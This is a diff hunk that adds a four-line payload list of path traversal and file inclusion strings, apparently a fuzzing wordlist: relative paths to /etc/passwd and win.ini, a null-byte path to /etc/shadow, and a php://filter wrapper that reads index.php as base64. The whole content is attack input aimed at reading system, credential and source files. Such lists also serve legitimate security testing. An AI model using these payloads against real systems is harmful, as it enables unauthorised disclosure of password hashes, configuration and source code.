@@ -1,0 +1,4 @@
+../../../../etc/passwd
+..%2f..%2f..%2fwin.ini
+%00/etc/shadow
+php://filter/read=convert.base64-encode/resource=index.php
